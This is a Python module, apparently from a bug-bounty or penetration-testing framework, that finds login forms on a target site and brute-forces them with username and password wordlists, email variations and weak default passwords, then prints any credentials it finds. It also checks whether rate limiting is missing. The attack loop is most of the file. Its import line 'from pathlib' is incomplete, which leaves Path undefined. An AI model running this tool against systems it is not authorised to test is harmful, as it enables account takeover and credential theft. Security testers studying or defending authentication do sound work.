import asyncio
from typing import List, Dict, Optional, Tuple, Set
from core.base_module import BaseModule, Finding
from pathlib


class CredentialTester(BaseModule):
    """Test for brute force vulnerabilities with stealth"""

    def __init__(self, config, stealth=None, db=None, graph_manager=None):
        super().__init__(config, stealth, db, graph_manager)
        self.max_attempts   = config.get('max_attempts', 50)
        self.delay          = config.get('delay_between', 1)
        self.wordlist_path  = config.get('wordlist_path', 'wordlists')

    async def run(self, target: str, **kwargs) -> List[Finding]:
        """Run brute force tests"""
        self.logger.info(f"Testing brute force protections on {target}")

        if not kwargs.get('enable_brute_force', False):
            self.logger.info("Brute force testing disabled (use --enable-brute-force to enable)")
            return self.findings

        login_endpoints = await self._discover_login_forms(target)

        if not login_endpoints:
            self.logger.warning("No login endpoints discovered")
            login_endpoints = [{'url': target, 'type': 'direct', 'fields': {}}]

        for endpoint in login_endpoints:
            await self._test_rate_limiting(endpoint)
            await self._test_brute_force(endpoint)

        return self.findings

    async def _discover_login_forms(self, target: str) -> List[Dict]:
        """Discover login endpoints - always tests target + common paths"""
        import re
        endpoints = []
        seen_urls = set()

        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"

        from urllib.parse import urlparse, urljoin
        base = f"{urlparse(target).scheme}://{urlparse(target).netloc}"

        candidate_urls = [target]
        for path in [
            '/login', '/signin', '/auth', '/authenticate',
            '/admin', '/admin/login', '/user/login', '/account/login',
            '/api/login', '/api/auth', '/api/token',
            '/wp-login.php', '/administrator/index.php',
            '/admin.html', '/login.html', '/signin.html',
        ]:
            candidate_urls.append(base + path)

        for url in candidate_urls:
            if url in seen_urls:
                continue
            seen_urls.add(url)

            try:
                response = await self._make_request(url)
                if not response or response.status not in [200, 301, 302]:
                    continue

                text = await response.text()
                indicators = ['password', 'login', 'username', 'email', 'sign in', 'log in',
                              'signin', 'passwd', 'credentials']

                if not any(ind in text.lower() for ind in indicators):
                    continue

                fields    = self._extract_form_fields(text)
                post_url  = url
                if fields.get('action'):
                    action = fields['action']
                    if action.startswith('http'):
                        post_url = action
                    elif action.startswith('/'):
                        post_url = base + action
                    else:
                        post_url = urljoin(url, action)

                endpoints.append({
                    'url':          post_url,
                    'type':         'form',
                    'fields':       fields,
                    'discovered_at': url
                })
                self.logger.info(f"Found login endpoint: {post_url} (from {url})")

            except Exception as e:
                self.logger.debug(f"Login discovery error on {url}: {e}")

        seen   = set()
        unique = []
        for ep in endpoints:
            if ep['url'] not in seen:
                seen.add(ep['url'])
                unique.append(ep)

        return unique

    def _extract_form_fields(self, html: str) -> Dict:
        """Extract form fields from HTML with automatic username/email detection"""
        import re
        fields  = {}
        
        # Find all input fields
        inputs  = re.findall(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*>', html, re.IGNORECASE)
        fields['inputs'] = inputs
        
        # Find form action
        action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.IGNORECASE)
        fields['action'] = action.group(1) if action else ''
        
        # Categorize all potential username fields found
        username_candidates = ['username', 'user', 'uname', 'login', 'name', 'account']
        email_candidates = ['email', 'mail', 'user_email', 'e-mail', 'email_address', 'mail_address']
        password_candidates = ['password', 'pass', 'pwd', 'passwd', 'user_password', 'auth_pass']
        
        fields['username_fields'] = []  # Can have multiple: ['username', 'email']
        fields['password_field'] = None
        
        # Detect all username/email fields present in the form
        for inp in inputs:
            inp_lower = inp.lower()
            
            # Check for email fields
            for candidate in email_candidates:
                if candidate in inp_lower:
                    if inp not in fields['username_fields']:
                        fields['username_fields'].append(inp)
                    break
            
            # Check for username fields  
            for candidate in username_candidates:
                if candidate in inp_lower:
                    if inp not in fields['username_fields']:
                        fields['username_fields'].append(inp)
                    break
            
            # Check for password field
            if not fields['password_field']:
                for candidate in password_candidates:
                    if candidate in inp_lower:
                        fields['password_field'] = inp
                        break
        
        # If no username/email field detected, analyze form context
        if not fields['username_fields']:
            # Check if form has email-type input
            email_type_inputs = re.findall(r'<input[^>]+type=["\']email["\'][^>]+name=["\']([^"\']+)["\']', html, re.IGNORECASE)
            if email_type_inputs:
                fields['username_fields'] = email_type_inputs
            else:
                # Default based on form context
                html_lower = html.lower()
                if 'email' in html_lower and 'username' not in html_lower:
                    fields['username_fields'] = ['email']
                elif 'username' in html_lower and 'email' not in html_lower:
                    fields['username_fields'] = ['username']
                else:
                    # Try both if unclear
                    fields['username_fields'] = ['email', 'username']
        
        if not fields['password_field']:
            fields['password_field'] = 'password'
            
        # For backward compatibility, also set single values
        fields['username_field'] = fields['username_fields'][0] if fields['username_fields'] else 'email'
        fields['email_field'] = fields['username_fields'][0] if fields['username_fields'] else 'email'
        
        self.logger.info(f"Detected fields: usernames={fields['username_fields']}, password={fields['password_field']}")
        
        return fields

    def _load_wordlists(self) -> Tuple[List[str], List[str]]:
        """Load usernames and passwords from wordlists"""
        usernames = []
        passwords = []

        user_file = Path(self.wordlist_path) / 'usernames.txt'
        if user_file.exists():
            with open(user_file, 'r') as f:
                usernames = [line.strip() for line in f if line.strip()]
            self.logger.info(f"Loaded {len(usernames)} usernames")
        else:
            self.logger.warning(f"Usernames file not found: {user_file}")
            usernames = ['admin', 'administrator', 'user', 'test', 'root', 'admin@email.com']

        pass_file = Path(self.wordlist_path) / 'passwords.txt'
        if pass_file.exists():
            with open(pass_file, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
            self.logger.info(f"Loaded {len(passwords)} passwords")
        else:
            self.logger.warning(f"Passwords file not found: {pass_file}")
            passwords = ['admin', 'password', '123456', 'login', 'admin123']

        return usernames, passwords

    def _generate_username_variations(self, base_usernames: List[str]) -> Set[str]:
        """Generate all possible username variations (username, email, etc.)"""
        variations = set()
        
        for username in base_usernames:
            # Original value
            variations.add(username)
            
            # If it looks like an email, also add the local part as username
            if '@' in username:
                local_part = username.split('@')[0]
                variations.add(local_part)
                
                # Common variations
                variations.add(local_part + '@email.com')
                variations.add(local_part + '@gmail.com')
                variations.add(local_part + '@admin.com')
            else:
                # If it's a plain username, also try as email
                variations.add(username + '@email.com')
                variations.add(username + '@gmail.com')
                variations.add(username + '@admin.com')
                variations.add(username + '@company.com')
        
        return variations

    async def _test_brute_force(self, endpoint: Dict):
        """Test brute force with wordlists - tries all username field combinations"""
        url            = endpoint['url']
        fields         = endpoint.get('fields', {})
        
        # Get all detected username fields and password field
        username_fields = fields.get('username_fields', ['email', 'username'])
        password_field  = fields.get('password_field', 'password')
        
        self.logger.info(f"Starting brute force on {url}")
        self.logger.info(f"Detected username fields: {username_fields}")
        self.logger.info(f"Password field: {password_field}")

        base_usernames, passwords = self._load_wordlists()
        
        # Generate all username variations (username, email formats, etc.)
        all_usernames = self._generate_username_variations(base_usernames)
        self.logger.info(f"Testing with {len(all_usernames)} username variations")

        successful_logins = []
        rate_limited      = False
        attempt_count     = 0

        # Try each username variation against each password
        for username in all_usernames:
            for password in passwords:
                attempt_count += 1
                
                # STRATEGY: Try the username in ALL detected username fields
                # This handles forms that accept either username OR email in the same field
                # OR forms that have separate username AND email fields
                
                login_data = {password_field: password}
                
                # Add username to all detected username fields
                for field in username_fields:
                    login_data[field] = username
                
                # Also add as 'username' and 'email' if not already present
                # This ensures coverage even if detection missed something
                if 'username' not in login_data:
                    login_data['username'] = username
                if 'email' not in login_data:
                    login_data['email'] = username

                try:
                    self.logger.debug(f"Attempt {attempt_count}: {username}:{password} (fields: {list(login_data.keys())})")
                    
                    response = await self._make_request(
                        url, method='POST', data=login_data, allow_redirects=False
                    )

                    if not response:
                        continue

                    is_success = await self._check_login_success(response, url)

                    if is_success:
                        sep = "=" * 60
                        print(f"\n\033[91m{sep}\033[0m")
                        print(f"\033[92m[!!!] CREDENTIALS FOUND!\033[0m")
                        print(f"\033[92m      Username : {username}\033[0m")
                        print(f"\033[92m      Password : {password}\033[0m")
                        print(f"\033[92m      URL      : {url}\033[0m")
                        print(f"\033[92m      Attempts : {attempt_count}\033[0m")
                        print(f"\033[91m{sep}\033[0m\n")

                        self.logger.info(f"CREDENTIALS FOUND: {username}:{password} @ {url}")
                        successful_logins.append({
                            'username': username,
                            'password': password,
                            'url':      url
                        })

                        finding = Finding(
                            module       = 'brute_force',
                            title        = f'[CREDENTIALS FOUND] {username}:{password} @ {url}',
                            severity     = 'Critical',
                            description  = (
                                f'Successfully brute-forced login at {url}\n'
                                f'Username : {username}\n'
                                f'Password : {password}\n'
                                f'Attempts : {attempt_count}'
                            ),
                            evidence     = {
                                'username': username,
                                'password': password,
                                'url':      url,
                                'attempts': attempt_count
                            },
                            poc          = (
                                f"curl -X POST '{url}' "
                                f"-d '{password_field}={password}' "
                                f"-d '{username_fields[0]}={username}'"
                            ),
                            remediation  = (
                                'Implement strong password policy, rate limiting, '
                                'and account lockout'
                            ),
                            cvss_score   = 9.8,
                            bounty_score = 5000,
                            target       = url
                        )
                        self.add_finding(finding)
                        return

                    if response.status in [429, 503, 403]:
                        rate_limited = True
                        self.logger.info(f"Rate limited after {attempt_count} attempts")
                        break

                    text               = await response.text()
                    lockout_indicators = [
                        'locked', 'blocked', 'too many attempts',
                        'try again later', 'suspended'
                    ]
                    if any(ind in text.lower() for ind in lockout_indicators):
                        self.logger.info(f"Account lockout detected after {attempt_count} attempts")
                        break

                except Exception as e:
                    self.logger.error(f"Error during brute force attempt: {e}")

            if rate_limited or len(successful_logins) > 0:
                break

        if not successful_logins and not rate_limited and attempt_count > 0:
            self.logger.info(f"No valid credentials found after {attempt_count} attempts")

        if rate_limited:
            finding = Finding(
                module       = 'brute_force',
                title        = 'Rate Limiting Detected During Brute Force',
                severity     = 'Info',
                description  = f'Rate limiting triggered after {attempt_count} attempts',
                evidence     = {'attempts': attempt_count, 'url': url},
                poc          = f"Send {attempt_count} login requests to {url}",
                remediation  = 'Rate limiting is working correctly',
                cvss_score   = 0.0,
                bounty_score = 0,
                target       = url
            )
            self.add_finding(finding)

    async def _check_login_success(self, response, url: str) -> bool:
        """Check if login was successful based on response"""
        try:
            if response.status in [301, 302, 303, 307, 308]:
                location = response.headers.get('Location', '')
                if location:
                    success_paths = ['/dashboard', '/admin', '/home', '/profile',
                                     '/account', '/welcome', '/panel', '/main', '/index']
                    if any(path in location.lower() for path in success_paths):
                        self.logger.info(f"Success detected: redirect to {location}")
                        return True
                    if 'login' in location.lower() or 'signin' in location.lower() or 'error' in location.lower():
                        return False

            if response.status == 200:
                text = await response.text()
                text_lower = text.lower()

                # Check for failure indicators first
                failure_indicators = [
                    'invalid', 'incorrect', 'failed', 'error', 'wrong',
                    'denied', 'unauthorized', 'try again', 'not found',
                    'authentication failed', 'login failed', 'invalid credentials',
                    'wrong password', 'user not found', 'account not found'
                ]

                for ind in failure_indicators:
                    if ind in text_lower:
                        self.logger.debug(f"Login failed - found indicator: '{ind}'")
                        return False

                # Check for success indicators
                success_indicators = [
                    'welcome', 'dashboard', 'logout', 'profile', 'admin panel',
                    'successful', 'logged in', 'session', 'token', 'api_key',
                    'sign out', 'my account', 'settings', 'control panel',
                    'administrator', 'management', 'overview'
                ]

                success_count = sum(1 for ind in success_indicators if ind in text_lower)

                # Check for session cookies (strong indicator)
                if 'Set-Cookie' in response.headers:
                    cookies = response.headers['Set-Cookie'].lower()
                    session_keywords = ['session', 'token', 'auth', 'jwt', 'sid', 'userid', 'user_id']
                    if any(sess in cookies for sess in session_keywords):
                        self.logger.info(f"Success detected: session cookie set")
                        return True

                if success_count >= 2:
                    self.logger.info(f"Success detected: {success_count} success indicators")
                    return True
                    
                # Check if we stayed on same page but content changed significantly
                if 'password' not in text_lower and ('welcome' in text_lower or 'hello' in text_lower):
                    return True

            return False

        except Exception as e:
            self.logger.error(f"Error checking login success: {e}")
            return False

    async def _test_rate_limiting(self, endpoint: Dict):
        """Test if rate limiting is implemented"""
        url       = endpoint['url']
        responses = []

        for i in range(min(5, self.max_attempts)):
            response = await self._make_request(
                url, method='POST',
                data={'username': f'test{i}', 'password': 'wrong'}
            )
            if response:
                responses.append(response.status)
            await asyncio.sleep(0.5)

        if 429 in responses or 503 in responses:
            self.logger.info(f"Rate limiting detected on {url}")
        else:
            finding = Finding(
                module       = 'brute_force',
                title        = 'Missing Rate Limiting on Authentication',
                severity     = 'High',
                description  = (
                    f'No rate limiting detected on {url} after '
                    f'{len(responses)} rapid requests'
                ),
                evidence     = {
                    'endpoint':  url,
                    'requests':  len(responses),
                    'responses': responses
                },
                poc          = f"Send multiple rapid login requests to {url}",
                remediation  = (
                    'Implement rate limiting '
                    '(max 5 attempts per IP per 15 minutes)'
                ),
                cvss_score   = 7.5,
                bounty_score = 1000,
                target       = url
            )
            self.add_finding(finding)
